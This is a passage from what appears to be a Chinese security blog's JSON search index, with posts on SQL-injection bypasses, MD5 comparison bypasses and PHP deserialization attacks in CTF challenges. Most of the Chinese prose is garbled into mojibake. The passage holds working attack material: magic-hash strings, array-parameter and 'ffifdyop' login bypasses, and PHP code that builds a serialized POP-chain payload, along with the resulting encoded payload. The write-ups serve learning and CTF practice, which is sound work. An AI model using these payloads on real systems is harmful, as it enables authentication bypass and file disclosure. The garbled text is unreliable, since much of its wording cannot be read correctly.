ÔºåÂêåÊ†∑ËøòÂèØ‰ª•‰ΩøÁî®left(),right(),reverse()ËøõË°åÁªÑÂêàÁªïËøá\nord()‚Äì&gt;ascii():Ëøô‰∏§‰∏™ÂáΩÊï∞Âú®Â§ÑÁêÜËã±ÊñáÊó∂ÊïàÊûú‰∏ÄÊ†∑Ôºå‰ΩÜÊòØÂ§ÑÁêÜ‰∏≠ÊñáÁ≠âÊó∂‰∏ç‰∏ÄËá¥„ÄÇ\n\n","categories":["SQLÊ≥®ÂÖ•"],"tags":["SQL","SQLÊ≥®ÂÖ•ÁªïËøá"]},{"title":"ÂÖ≥‰∫émd5ÁöÑÁªïËøáÊäÄÂ∑ß","url":"/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","content":"MD5ÂáΩÊï∞‰ªãÁªç\nËØ≠Ê≥ï\n‚Äã         md5(string,raw)\n\n\n\nÂèÇÊï∞\nÊèèËø∞\n\n\n\nstring\nÂøÖÈúÄ„ÄÇË¶ÅËÆ°ÁÆóÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ\n\n\nraw\nÂèØÈÄâ„ÄÇÈªòËÆ§‰∏çÂÜô‰∏∫FALSEÔºö32‰Ωç16ËøõÂà∂ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇTRUEÔºö16‰ΩçÂéüÂßã‰∫åËøõÂà∂Ê†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤\n\n\n\n\nMD5ÂáΩÊï∞ÊºèÊ¥û$str1 = $_GET['str1'];\n$str2 = $_GET['str2'];\nif (md5($str1) == md5($str2))&#123;\n\techo 'OK'; \n&#125;\n\n\nphpÂº±Á±ªÂûãÊØîËæÉ‰∫ßÁîüÁöÑÊºèÊ¥û\nÊÉ≥Ë¶ÅÊª°Ë∂≥Ëøô‰∏™Âà§Êñ≠Âè™ÈúÄË¶ÅÊûÑÈÄ†Âá∫MD5ÂÄº‰∏∫0eÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËøôÊ†∑ÁöÑËØùÂº±Á±ªÂûãÊØîËæÉ‰ºöËÆ§‰∏∫ÊòØÁßëÂ≠¶ÊäÄÊúØÊ≥ïÔºå0ÁöÑÂ§öÂ∞ëÊ¨°ÊñπÈÉΩÊòØ0ÔºåÂõ†Ê≠§ÂèØ‰ª•ÁªïËøá\n\n\nÊúâ‰∏Ä‰∫õÂ≠óÁ¨¶‰∏≤ÁöÑMD5ÂÄº‰∏∫0eÂºÄÂ§¥ÔºåËøôÈáåËÆ∞ÂΩï‰∏Ä‰∏ã\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\n\n\nËøòÊúâMD5ÂíåÂèåMD5‰ª•ÂêéÁöÑÂÄºÈÉΩÊòØ0eÂºÄÂ§¥ÁöÑ\nCbDLytmyGm2xQyaLNhWn\n770hQgrBOjrcqftrlaZk\n7r4lGXCH2Ksu2JNT3BYM\n\n\n\nPHPÁâπÊÄß$str1 = $_GET['str1'];\n$str2 = $_GET['str2'];\nif (md5($str1) === md5($str2)) &#123;\n\techo 'OK';\n&#125;\n\n\nÂõ†‰∏∫ÊòØÂº∫Á±ªÂûãÊØîËæÉÔºåÁî®0eÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤ÊòØÊ≤°ÂäûÊ≥ïÁªïËøáÁöÑ‰∫ÜÔºå‰ΩÜÊòØPHPËá™Ë∫´ÁöÑÁâπÊÄß‰ΩøÂæóÂèØ‰ª•Êèê‰∫§‰∏Ä‰∏™Êï∞ÁªÑÔºåËÄåmd5ÂáΩÊï∞‰º†ÂÖ•Êï∞ÁªÑÁöÑËøîÂõûÂÄºÈÉΩÊòØNULLÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÁªïËøáÂº∫Á±ªÂûãÊØîËæÉ‰∫Ü„ÄÇÊâÄ‰ª•ËøôÈáåÁî®GET‰º†ÂÖ•\n?str1[]&#x3D;1&amp;str2[]&#x3D;2Â∞±Ë°å‰∫Ü\n\nË°•ÂÖÖÔºömd5()ÊàñËÄÖsha1()‰πãÁ±ªÁöÑÂáΩÊï∞ËÆ°ÁÆóÁöÑÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÁöÑÂìàÂ∏åÂÄºÔºåÂØπ‰∫éÊï∞ÁªÑÂàôËøîÂõûfalseÔºåÂ¶ÇÊûú$str1Âíå$str2ÈÉΩÊòØÊï∞ÁªÑÂàôÂèåÂèåËøîÂõûFALSE, ‰∏§‰∏™FALSEÁõ∏Á≠âÂæó‰ª•ÁªïËøá\n\n\n\nMD5Á¢∞Êíû$str1 = (string)$_GET['str1'];\n$str2 = (string)$_GET['str2'];\nif (md5($str1) === md5($str2)) &#123;\n\techo 'OK';\n&#125;\n\n\nÁî±‰∫éÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢Ôºå‰º†Êï∞ÁªÑÂ∞±‰∏çÂèØË°å‰∫ÜÔºåËøôÈáåÂ∞±ÈúÄË¶ÅMD5Á¢∞ÊíûÔºåÂØπ‰∫éÈúÄË¶Å‰∏§‰∏™ÂÜÖÂÆπ‰∏çÂêå‰ΩÜÊòØMD5ÂÄºÁõ∏ÂêåÁöÑÊñá‰ª∂Ôºå‰ΩøÁî®FastcollÔºàÂ∑•ÂÖ∑‰∏ãËΩΩÔºâÂ∞±ÂèØ‰ª•‰∫Ü\n\nÁªïËøámd5()Êù•ÊûÑÈÄ†ÊîªÂáªËØ≠Âè•select * from 'admin' where password=md5($pass,true)\n\n\nffifdyop\nËøô‰∏™ÁÇπÁöÑÂéüÁêÜÊòØ ffifdyop Ëøô‰∏™Â≠óÁ¨¶‰∏≤Ë¢´ md5 ÂìàÂ∏å‰∫Ü‰πãÂêé‰ºöÂèòÊàê 276f722736c95d99e921722cf9ed621c   (ÂØπÂ∫îasciiÂ≠óÁ¨¶‰∏≤&#39;or&#39;6√â]¬ô√©!r,√π√≠b\u001c)ÔºåËøô‰∏™Â≠óÁ¨¶‰∏≤ÂâçÂá†‰ΩçÂàöÂ•ΩÊòØ ‚Äò or ‚Äò6ÔºåËÄå Mysql ÂàöÂ•ΩÂèà‰ºöÂêß hex ËΩ¨Êàê ascii Ëß£ÈáäÔºåÂõ†Ê≠§ÊãºÊé•‰πãÂêéÁöÑÂΩ¢ÂºèÊòØselect * from ‚Äòadmin‚Äô where password&#x3D;‚Äô‚Äô or ‚Äò6xxxxx‚Äô„ÄÇÁ≠â‰ª∑‰∫é or ‰∏Ä‰∏™Ê∞∏ÁúüÂºèÔºåÂõ†Ê≠§Áõ∏ÂΩì‰∫é‰∏áËÉΩÂØÜÁ†ÅÔºåÂèØ‰ª•ÁªïËøámd5()ÂáΩÊï∞\n\n\n\n","categories":["webÂÆâÂÖ®Âü∫Á°Ä"],"tags":["MD5"]},{"title":"phpÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁÆÄÂçïÊÄªÁªì","url":"/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/","content":"‰ªÄ‰πàÊòØÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ‚Äã    ËøôÂÖ∂ÂÆûÊòØ‰∏∫‰∫ÜËß£ÂÜ≥ PHP ÂØπË±°‰º†ÈÄíÁöÑ‰∏Ä‰∏™ÈóÆÈ¢ò,Âõ†‰∏∫ PHP  Êñá‰ª∂Âú®ÊâßË°åÁªìÊùü‰ª•ÂêéÂ∞±‰ºöÂ∞ÜÂØπË±°ÈîÄÊØÅÔºåÈÇ£‰πàÂ¶ÇÊûú‰∏ãÊ¨°Êúâ‰∏Ä‰∏™È°µÈù¢ÊÅ∞Â•ΩË¶ÅÁî®Âà∞ÂàöÂàöÈîÄÊØÅÁöÑÂØπË±°Â∞±‰ºöÊùüÊâãÊó†Á≠ñÔºåÊÄª‰∏çËÉΩ‰Ω†Ê∞∏Ëøú‰∏çËÆ©ÂÆÉÈîÄÊØÅÔºåÁ≠âÁùÄ‰Ω†ÂêßÔºå‰∫éÊòØ‰∫∫‰ª¨Â∞±ÊÉ≥Âá∫‰∫Ü‰∏ÄÁßçËÉΩÈïø‰πÖ‰øùÂ≠òÂØπË±°ÁöÑÊñπÊ≥ïÔºåËøôÂ∞±ÊòØ PHP ÁöÑÂ∫èÂàóÂåñÔºåÈÇ£ÂΩìÊàë‰ª¨‰∏ãÊ¨°Ë¶ÅÁî®ÁöÑÊó∂ÂÄôÂè™Ë¶ÅÂèçÂ∫èÂàóÂåñ‰∏Ä‰∏ãÂ∞± ok Âï¶„ÄÇ\nÂ∫èÂàóÂåñÊºîÁ§∫&lt;?php\n\nclass test&#123;\n\n    public $name = 'name';  \n\n    private $sex = 'sex';  \n\n    protected $age = '20';\n\n&#125;\n\n$test1 = new test();\n\n$object = serialize($test1);\n\necho $object;\n\n?>\n\nÂÖ∂ËæìÂá∫ÁªìÊûú‰∏∫\nO:4:\"test\":3:&#123;s:4:\"name\";s:4:\"name\";s:9:\"testsex\";s:3:\"sex\";s:6:\"*age\";s:2:\"20\";&#125;\n\nÂ∫èÂàóÂåñÂ∞±ÊòØÂ∞ÜÂéüÊúâÁöÑÂØπË±°ËΩ¨Êç¢‰∏∫‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤\nËøô‰∏™Â≠óÁ¨¶‰∏≤‰∏≠Â≠òÂÇ®ËøôÂØπË±°ÁöÑ‰ø°ÊÅØÔºåÂú®ÈúÄË¶ÅÁöÑÊó∂ÂÄôÂè™ÈúÄÂÜçÂ∞ÜËøô‰∏≤Â≠óÁ¨¶‰∏≤ÂèçÂ∫èÂàóÂåñÂ∞±ËÉΩÂæóÂà∞ÂØπÂ∫îÁöÑÁ±ªÂØπË±°„ÄÇ\nËøôÈáåÂÖ≥ÈîÆÂáΩÊï∞serialize()Â∞ÜÂØπË±°Â∫èÂàóÂåñ\nÊúâÂá†‰∏™Ë¶ÅÁÇπ\n\nprivateÂ±ûÊÄßÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00Á±ªÂêç%00ÊàêÂëòÂêç\nprotectedÂ±ûÊÄßÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00*%00ÊàêÂëòÂêç\n\nÊ≥®ÊÑèÔºö\n\n‰∏ÄËà¨ÂÅöÈ¢òÊó∂Â∫îÂΩìÁõ¥Êé•Â∞ÜÂ∫èÂàóÂåñÂêéÁöÑÂ≠óÁ¨¶‰∏≤ËøõË°åurlencodeÔºåÂ¶ÇÊûúÁõ¥Êé•ÊâìÂç∞Âú®ÊµèËßàÂô®‰∏äÂÖ∂‰∏≠ÁöÑ%00‰∏ç‰ºöÊòæÁ§∫ÔºåÊâãÂä®Â§çÂà∂ÊòØÊ≤°Êúâ %00ÁöÑ„ÄÇ\nÂ∫èÂàóÂåñÂè™Â∫èÂàóÂåñÂ±ûÊÄß‰∏çÂ∫èÂàóÂåñÊñπÊ≥ï(ÂáΩÊï∞)„ÄÇ\n\nÂèçÂ∫èÂàóÂåñÊºîÁ§∫&lt;?php\n\nclass test&#123;\n\n    public $name = 'name';  \n\n    private $sex = 'sex';  \n\n    protected $age = '20';\n\n&#125;\n\n$test1 = new test();\n\n$object = serialize($test1);//Â∫èÂàóÂåñÂØπË±°\n\necho $object;\n\n\n$newObj = unserialize($object);//ÂèçÂ∫èÂàóÂåñ\n\nvar_dump($newObj)\n\n?>\n\nËøêË°åÂæóÂà∞\n\nÊ≥®ÊÑèÔºö\n(1)Êàë‰ª¨Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄô‰∏ÄÂÆöË¶Å‰øùËØÅÂú®ÂΩìÂâçÁöÑ‰ΩúÁî®ÂüüÁéØÂ¢É‰∏ãÊúâËØ•Á±ªÂ≠òÂú®\n‚Äã    ËøôÈáåÂÖàÁÆÄÂçïËØ¥‰∏Ä‰∏ãÔºåÂèçÂ∫èÂàóÂåñÂ∞±ÊòØÂ∞ÜÊàë‰ª¨ÂéãÁº©Ê†ºÂºèÂåñÁöÑÂØπË±°ËøòÂéüÊàêÂàùÂßãÁä∂ÊÄÅÁöÑËøáÁ®ãÔºàÂèØ‰ª•ËÆ§‰∏∫ÊòØËß£ÂéãÁº©ÁöÑËøáÁ®ãÔºâÔºåÂõ†‰∏∫Êàë‰ª¨Ê≤°ÊúâÂ∫èÂàóÂåñÊñπÊ≥ïÔºåÂõ†Ê≠§Âú®ÂèçÂ∫èÂàóÂåñ‰ª•ÂêéÊàë‰ª¨Â¶ÇÊûúÊÉ≥Ê≠£Â∏∏‰ΩøÁî®Ëøô‰∏™ÂØπË±°ÁöÑËØùÊàë‰ª¨ÂøÖÈ°ªË¶Å‰æùÊâò‰∫éËøô‰∏™Á±ªË¶ÅÂú®ÂΩìÂâç‰ΩúÁî®ÂüüÂ≠òÂú®ÁöÑÊù°‰ª∂„ÄÇ\n(2)Êàë‰ª¨Âú®ÂèçÂ∫èÂàóÂåñÊîªÂáªÁöÑÊó∂ÂÄô‰πüÂ∞±ÊòØ‰æùÊâòÁ±ªÂ±ûÊÄßËøõË°åÊîªÂáª\n‚Äã    Êàë‰ª¨ËÉΩÊéßÂà∂ÁöÑÂè™ÊúâÁ±ªÁöÑÂ±ûÊÄßÔºåÂõ†Ê≠§Á±ªÂ±ûÊÄßÂ∞±ÊòØÊàë‰ª¨ÂîØ‰∏ÄÁöÑÊîªÂáªÂÖ•Âè£ÔºåÂú®Êàë‰ª¨ÁöÑÊîªÂáªÊµÅÁ®ã‰∏≠ÔºåÊàë‰ª¨Â∞±ÊòØË¶ÅÂØªÊâæÂêàÈÄÇÁöÑËÉΩË¢´Êàë‰ª¨ÊéßÂà∂ÁöÑÂ±ûÊÄßÔºåÁÑ∂ÂêéÂà©Áî®ÂÆÉÊú¨Ë∫´ÁöÑÂ≠òÂú®ÁöÑÊñπÊ≥ïÔºåÂú®Âü∫‰∫éÂ±ûÊÄßË¢´ÊéßÂà∂ÁöÑÊÉÖÂÜµ‰∏ãÂèëÂä®Êàë‰ª¨ÁöÑÂèëÂ∫èÂàóÂåñÊîªÂáª\nÂ¶Ç‰ΩïÂà©Áî®ÂèçÂ∫èÂàóÂåñËøõË°åÊîªÂáªÂâçÊèêÊù°‰ª∂Ôºö\n\nÂøÖÈ°ªÊúâunserialize()ÊñπÊ≥ï\n‰ΩúÁî®Âüü‰∏ãÊúâÁõ∏Â∫îÁöÑÁ±ªÂ≠òÂú®‰∏îÁ±ª‰∏≠Â≠òÂú®È≠îÊúØÊñπÊ≥ï\n\nÁî±‰∫éÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÂè™ÂØπÁ±ª‰∏≠ÁöÑÂ±ûÊÄßÊúâÊïàÔºåÂπ∂‰∏ç‰ºöÂØπÊñπÊ≥ïÁîüÊïà„ÄÇÊâÄ‰ª•phpÈ≠îÊúØÊñπÊ≥ïÂ∞±Êàê‰∫ÜÂÖ≥ÈîÆ„ÄÇ\n‰ªÄ‰πàÊòØÈ≠îÊúØÊñπÊ≥ï‚Äã    php Â∞ÜÊâÄÊúâ‰ª• __Ôºà‰∏§‰∏™‰∏ãÂàíÁ∫øÔºâÂºÄÂ§¥ÁöÑÁ±ªÊñπÊ≥ï‰øùÁïô‰∏∫È≠îÊúØÊñπÊ≥ï„ÄÇÊâÄ‰ª•Âú®ÂÆö‰πâÁ±ªÊñπÊ≥ïÊó∂ÔºåÈô§‰∫Ü‰∏äËø∞È≠îÊúØÊñπÊ≥ïÔºåÂª∫ËÆÆ‰∏çË¶Å‰ª•  __ ‰∏∫ÂâçÁºÄ„ÄÇ È≠îÊúØÊñπÊ≥ï‰∏çÈúÄË¶Å‰∫∫‰∏∫Ë∞ÉÁî®ÔºåÂÆÉ‰ºöÂú®ÁâπÂÆöÊù°‰ª∂‰∏ãËá™Âä®Ë∞ÉÁî®„ÄÇ\n‚Äã    Â∏∏ËßÅÁöÑÈ≠îÊúØÊñπÊ≥ïÂ¶Ç‰∏ãÔºö\n__construct()//Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞ÔºåÂàõÂª∫Á±ªÂØπË±°Êó∂Ë∞ÉÁî®\n\n__destruct()//Á±ªÁöÑÊûêÊûÑÂáΩÊï∞ÔºåÂØπË±°ÈîÄÊØÅÊó∂Ë∞ÉÁî®\n\n__call()//Âú®ÂØπË±°‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂèØËÆøÈóÆÊñπÊ≥ïÊó∂Ë∞ÉÁî®\n\n__callStatic()//Áî®ÈùôÊÄÅÊñπÂºè‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂèØËÆøÈóÆÊñπÊ≥ïÊó∂Ë∞ÉÁî®\n\n__get()//Ëé∑Âæó‰∏Ä‰∏™Á±ªÁöÑÊàêÂëòÂèòÈáèÊó∂Ë∞ÉÁî®\n\n__set()//ËÆæÁΩÆ‰∏Ä‰∏™Á±ªÁöÑÊàêÂëòÂèòÈáèÊó∂Ë∞ÉÁî®\n\n__isset()//ÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®isset()Êàñempty()Êó∂Ë∞ÉÁî®\n\n__unset()//ÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®unset()Êó∂Ë¢´Ë∞ÉÁî®„ÄÇ\n\n__sleep()//ÊâßË°åserialize()Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞\n\n__wakeup()//ÊâßË°åunserialize()Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞\n\n__toString()//Á±ªË¢´ÂΩìÊàêÂ≠óÁ¨¶‰∏≤Êó∂ÁöÑÂõûÂ∫îÊñπÊ≥ï\n\n__invoke()//Ë∞ÉÁî®ÂáΩÊï∞ÁöÑÊñπÂºèË∞ÉÁî®‰∏Ä‰∏™ÂØπË±°Êó∂ÁöÑÂõûÂ∫îÊñπÊ≥ï\n\n__set_state()//Ë∞ÉÁî®var_export()ÂØºÂá∫Á±ªÊó∂ÔºåÊ≠§ÈùôÊÄÅÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ\n\n__clone()//ÂΩìÂØπË±°Â§çÂà∂ÂÆåÊàêÊó∂Ë∞ÉÁî®\n\n__autoload()//Â∞ùËØïÂä†ËΩΩÊú™ÂÆö‰πâÁöÑÁ±ª\n\n__debugInfo()//ÊâìÂç∞ÊâÄÈúÄË∞ÉËØï‰ø°ÊÅØ\n\nÈáçÁÇπËØ¥ÊòéÔºö\n\n__construct()ÔºöÂΩìÂØπË±°ÂàõÂª∫Êó∂‰ºöËá™Âä®Ë∞ÉÁî®(Âú®unserialize()ÁªìÊùüÂêéË∞ÉÁî®)\n__wakeup() Ôºöunserialize()Êó∂‰ºöËá™Âä®Ë∞ÉÁî®\n__destruct()ÔºöÂΩìÂØπË±°Ë¢´ÈîÄÊØÅÊó∂‰ºöËá™Âä®Ë∞ÉÁî®\n__toString():ÂΩìÂèçÂ∫èÂàóÂåñÂêéÁöÑÂØπË±°Ë¢´ËæìÂá∫Âú®Ê®°Êùø‰∏≠ÁöÑÊó∂ÂÄôÔºàËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤ÁöÑÊó∂ÂÄôÔºâËá™Âä®Ë∞ÉÁî®„ÄÇ‰æãÂ¶ÇÊâßË°å                   echo new test();ÂÖ∂Â∞±‰ºöËá™Âä®Ë∞ÉÁî®ÂØπË±°‰∏≠ÁöÑ__toStrong()ÊñπÊ≥ï\n__get() :ÂΩì‰ªé‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄßËØªÂèñÊï∞ÊçÆ„ÄÇ‰æãÂ¶Ç‰ªéÂØπË±°Â§ñÈÉ®ËÆøÈóÆÁî±privateÂíåprotect‰øÆÈ•∞ÁöÑÂ±ûÊÄßÔºåÂ∞±‰ºöË∞ÉÁî®ËØ•ÊñπÊ≥ïÔºåÂÖ∂‰∏≠‰º†ÈÄíÁöÑÂΩ¢ÂèÇ‰∏∫ËÆøÈóÆÂ±ûÊÄßÁöÑÂ±ûÊÄßÂêç\n\npsÔºö‰∏äËø∞Áî®Ê≥ïËØ¥Êòé‰∏çÂÖ®Ôºå‰ΩøÁî®Êó∂Â∫îÂèÇËÄÉÁõ∏Â∫îÊñáÊ°£\nÁÆÄÂçïÁöÑÊ°à‰æãÈ¢òÁõÆÈìæÊé•\nÊâìÂºÄÂÆ°ËÆ°Ê∫êÁ†Å\n&lt;?php\nclass example &#123;\n    public $str;\n    public function __toString()\n    &#123;\n        \n        return $this->str->flag;\n    &#125;\n&#125;\n\nclass get &#123;\n    private $flag;\n    public function __get($name)\n    &#123;\n        include($name.$this->flag);\n        return $flag;//flag in flag.php\n    &#125;\n&#125;\n\nif(isset($_GET['a'])) &#123;\n    $a = unserialize($_GET['a']);\n    \n    echo $a;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n\nËøôÈáåÁõÆÁöÑÊòØË¶ÅËß¶Âèë __get() Ëøô‰∏™ÂáΩÊï∞ÔºåÈ≠îÊúØÊñπÊ≥ï__get()‰ºöÂú®Áî±Â§ñÈÉ®ËÆøÈóÆÂØπË±°‰∏≠ÁöÑÁßÅÊúâÂ±ûÊÄßÊó∂Ëá™Âä®Ë∞ÉÁî®ÔºåÂÖ∂‰∏≠ÂèÇÊï∞‰º™ËÆøÈóÆÂ±ûÊÄßÁöÑÂ±ûÊÄßÂêç„ÄÇÂÜçËßÇÂØüexampleËøô‰∏™Á±ªÔºåËøôÈáåÂèëÁé∞  __toStrong() ÊñπÊ≥ïÔºåËÄåÂèàÂ≠òÂú® echo $a ËøôÂè•ÔºåÊâÄ‰ª•ÂèØ‰ª•Á°ÆÂÆöË¶ÅÊûÑÈÄ†ÁöÑËøô‰∏™ $a Â∞±ÊòØ exampleËøô‰∏™Á±ªÁöÑÂØπË±°ÔºåËÄå‰∏îËøô‰∏™ÂØπË±°‰∏≠ÁöÑÂ±ûÊÄß $flag ‰πüÂ∫î‰∏∫ get Ëøô‰∏™Á±ªÁöÑÂØπË±°Ôºå‰ªéËÄå ÊâßË°å return $this-&gt;str-&gt;flagÊó∂Â∞±‰ºöË∑≥ËΩ¨Âà∞ get ÂØπË±°ÁöÑ È≠îÊúØÊñπÊ≥ï __get($name) Ôºà$name‰∏∫Ë¶ÅËÆøÈóÆÁöÑÁßÅÊúâÂ±ûÊÄßÁöÑÂêçÁß∞ÔºåÂç≥ flag Ëøô‰∏™Â±ûÊÄßÂêçÔºâ„ÄÇ‰πãÂêéË¶Å include &#39;flag.php&#39;ÔºåÁî±‰∫é$name &#x3D;&#x3D; flagÔºåÊâÄ‰ª•Ë¶ÅÊûÑÈÄ† $flag &#x3D;&#x3D; ‚Äò.php‚Äô ÔºåÊãºÊé•Ëµ∑Êù•Â∞±ÂèØ‰ª•ÂåÖÂê´ ‚Äòflag.php‚Äô ‰ªéËÄåÊãøÂà∞flag„ÄÇ\nÂç≥\n&lt;?php\nclass example &#123;\n    public $str;\n&#125;\nclass get &#123;\n    private $flag;\n    function __construct($flag)\n    &#123;\n        $this->flag = $flag;\n    &#125;\n&#125;\n$a = new example();\n$b = new get('.php');\n$a->str = $b;\necho urlencode(serialize($a));\n\nËøêË°åÂæóÂà∞payload\nO%3A7%3A%22example%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A3%3A%22get%22%3A1%3A%7Bs%3A9%3A%22%00get%00flag%22%3Bs%3A4%3A%22.php%22%3B%7D%7D\n\n‚Äã    ÂØπËøôÈÅìÈ¢òÁöÑÁÆÄÂçïÁÆÄÂçïÁöÑÊÄªÁªìÔºöÈ¶ñÂÖàÂøÖÈúÄË¶Å‰∫ÜËß£phpÂú®ÂèçÂ∫èÂàóÂåñ‰∏≠ËøôÂá†‰∏™È≠îÊúØÊñπÊ≥ïÁöÑÁî®Ê≥ïÔºåÂ¶ÇÊûúËøûËøô‰∏™ÈÉΩ‰∏çÁü•ÈÅìÁöÑËØùÂü∫Êú¨Â∞±Ê≤°Ê≥ïÂÅö„ÄÇÂè¶Â§ñË¶Å‰∫ÜËß£Èù¢ÂêëÂØπË±°ÁöÑËøôÁßçÁºñÁ®ãÊÄùÊÉ≥ÔºåÊ≥®ÊÑèÂØπË±°Âú®ÂÖ∂‰∏≠ÁöÑÂêÑÁßçÂ∫îÁî®„ÄÇÁ±ª‰ººÁöÑÂÖ∂‰ªñÁöÑphpÂèçÂ∫èÂàóÂåñÁöÑÈ¢òÁõÆÂü∫Êú¨‰∏ä‰πüÈÉΩÊòØÁõ∏ÂêåÁöÑÊÄùË∑ØÔºåÊòéÁôΩÂ¶Ç‰ΩïÈÄöËøáÂ∑≤Áü•ÁöÑ‰ª£Á†ÅÂ∞ÜÂêÑÂØπË±°‰πãÈó¥ËÅîÁ≥ªËµ∑Êù•„ÄÇ\n‰æãÈ¢òctfshowÂç∑ÁéãÊùØ web1 easy unserialize\nÂÆ°ËÆ°Ê∫êÁ†Å\n&lt;?php\nclass one &#123;\n    public $object;\n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                include('flag.php');\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    protected $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\nif (isset($_GET[\"payload\"])) &#123;\n    unserialize($_GET['payload']);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n‚Äã    ËøôÈáåÂü∫Êú¨ÁöÑÈ≠îÊúØÊñπÊ≥ïÂ∞±‰∏çÂÜçËß£Èáä‰∫ÜÔºåÈáçÁÇπËØ¥‰∏Ä‰∏ãËøôÂá†‰∏™‰∏çÂ∏∏ËßÅÁöÑ„ÄÇ\n‚Äã    ËøôÈáåÈ¶ñÂÖàËß£Èáä‰∏Ä‰∏ã array_walk()Ëøô‰∏™ÂáΩÊï∞„ÄÇËøô‰∏™ÂáΩÊï∞Âú®ÂΩìÂâçÈ¢òÁõÆÁöÑÂΩ¢ÂºèÊòØ array_walk($array, function($value, $key) &#123;&#125;) ÔºåËøô‰∏™ÂáΩÊï∞ÂèØ‰ª•Â∞ÜÁõÆÊ†áÊï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂÖÉÁ¥†ÁªôÂêéÈù¢ÂèÇÊï∞‰∏≠ÁöÑÂáΩÊï∞Êù•Â§ÑÁêÜÔºåËøôÈáå $array ÊòØ‰∏Ä‰∏™Êï∞ÁªÑ Êàñ‰∏Ä‰∏™Á±ªÂØπË±°ÔºàÂÖ∂ÂèØ‰ª•Áúã‰ΩúÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåÂÖ∂‰∏≠ÁöÑÂ±ûÊÄß‰∏∫Êï∞ÁªÑ‰∏≠ÁöÑÈîÆÂÄºÂØπÔºâ„ÄÇÂêéÈù¢ÁöÑÂåøÂêçÂáΩÊï∞Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Êï∞ÁªÑÔºàÂØπË±°Ôºâ‰∏≠ÁöÑ ‚ÄúÂÄº‚ÄùÔºàÂ±ûÊÄßÂÄºÔºâÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫Êï∞ÁªÑÔºàÂØπË±°Ôºâ‰∏≠ÁöÑ ‚ÄúÈîÆ‚ÄùÔºàÂ±ûÊÄßÂêçÔºâ„ÄÇ\n‚Äã    ÂêéÈù¢ __call($func, $args) ÂáΩÊï∞ÊòØÂú®Ë∞ÉÁî®ÂØπË±°‰∏≠‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÊó∂‰ºöËá™Âä®Ë∞ÉÁî®ÔºåÂèÇÊï∞ $func ÊòØÊâÄË∞ÉÁî®ÂáΩÊï∞ÁöÑÂáΩÊï∞ÂêçÔºå $args ÊòØÂØπÂ∫îÂáΩÊï∞ÁöÑÂèÇÊï∞„ÄÇ call_user_func([$this, $func], $args) ÊñπÊ≥ïÊòØË∞ÉÁî®ÂØπË±°‰∏≠ÂÖ∑‰ΩìÂáΩÊï∞ÁöÑ‰∏ÄÁßçÊñπÊ≥ïÔºå[]‰∏≠Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÂØπË±°ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫ÂØπË±°‰∏≠ÈúÄË¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞ÁöÑÂáΩÊï∞ÂêçÔºàÂ≠óÁ¨¶‰∏≤Ê†ºÂºèÔºâ,$args ÂèÇÊï∞ÊòØÊâÄË∞ÉÁî®ÂáΩÊï∞‰∏≠ÁöÑÂèÇÊï∞„ÄÇ\n‚Äã    __get($name) 